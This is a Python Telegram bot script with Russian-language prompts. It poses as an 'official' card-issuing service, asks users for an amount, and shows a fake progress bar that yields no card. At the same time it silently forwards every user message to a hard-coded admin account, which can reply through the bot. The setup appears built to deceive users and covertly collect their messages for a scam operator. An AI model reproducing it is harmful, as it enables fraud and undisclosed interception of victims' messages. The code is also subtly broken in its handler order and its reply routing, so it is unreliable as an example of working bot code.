import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = os.environ.get("TOKEN")

ADMIN_ID = 8065330336

if not TOKEN:
    raise ValueError("Не установлен токен бота")

# --- клавиатуры ---
def make_keyboard(options):
    return ReplyKeyboardMarkup([options], one_time_keyboard=True, resize_keyboard=True)

start_kb = make_keyboard(["Старт"])
yes_kb = make_keyboard(["Да"])
amount_kb = make_keyboard(["200", "400", "600"])


# --- старт ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    photo_path = os.path.join("images", "card.jpg")

    if os.path.exists(photo_path):
        with open(photo_path, "rb") as photo_file:
            await update.message.reply_photo(
                photo=photo_file,
                caption="Здравствуйте, это официальный бот для карточек. Чтобы получить карточку, нажмите Старт",
                reply_markup=start_kb
            )
    else:
        await update.message.reply_text(
            "Здравствуйте, это официальный бот для карточек. Чтобы получить карточку, нажмите Старт",
            reply_markup=start_kb
        )


# --- генерация карточек ---
async def send_cards(update, amount):

    await update.message.reply_text(f"Генерируем пакет карточек ({amount})")

    total_seconds = 14
    loading_msg = await update.message.reply_text("Загрузка: " + "░" * total_seconds)

    for i in range(1, total_seconds + 1):
        await asyncio.sleep(1)

        bar = "█" * i + "░" * (total_seconds - i)
        await loading_msg.edit_text(f"Загрузка: {bar}")

    await loading_msg.edit_text("Карточка")


# --- пересылка ВСЕХ сообщений админу ---
async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user_id = update.effective_user.id

    if user_id == ADMIN_ID:
        return

    await context.bot.forward_message(
        chat_id=ADMIN_ID,
        from_chat_id=update.effective_chat.id,
        message_id=update.message.message_id
    )


# --- ответ администратора ---
async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != ADMIN_ID:
        return

    if not update.message.reply_to_message:
        return

    original = update.message.reply_to_message

    if original.forward_from_chat:

        user_id = original.forward_from_chat.id

        if update.message.text:
            await context.bot.send_message(
                chat_id=user_id,
                text=update.message.text
            )

        elif update.message.photo:
            await context.bot.send_photo(
                chat_id=user_id,
                photo=update.message.photo[-1].file_id,
                caption=update.message.caption
            )


# --- логика бота ---
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):

    text = update.message.text.strip()

    state = context.user_data.get("state", "START")

    if state == "START" and text == "Старт":

        await update.message.reply_text(
            "Я разработан компанией сисистик для выдачи карточек. Вы хотите получить карточку сейчас?",
            reply_markup=yes_kb
        )

        context.user_data["state"] = "ASK_YES"

    elif state == "ASK_YES" and text == "Да":

        await update.message.reply_text(
            "Хорошо, на какую сумму вы хотите получить карточки?",
            reply_markup=amount_kb
        )

        context.user_data["state"] = "ASK_AMOUNT"

    elif state == "ASK_AMOUNT" and text in ["200", "400", "600"]:

        await send_cards(update, text)

        context.user_data["state"] = "START"

    else:

        await update.message.reply_text(
            "Пожалуйста, используйте кнопки ниже для выбора."
        )


# --- запуск ---
app = ApplicationBuilder().token(TOKEN).build()

# пересылка всех сообщений
app.add_handler(MessageHandler(filters.ALL & ~filters.User(ADMIN_ID), forward_to_admin))

# ответы администратора
app.add_handler(MessageHandler(filters.ALL & filters.User(ADMIN_ID), admin_reply))

# команды бота
app.add_handler(CommandHandler("start", start))

# текстовая логика
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))


print("Бот запущен...")
app.run_polling()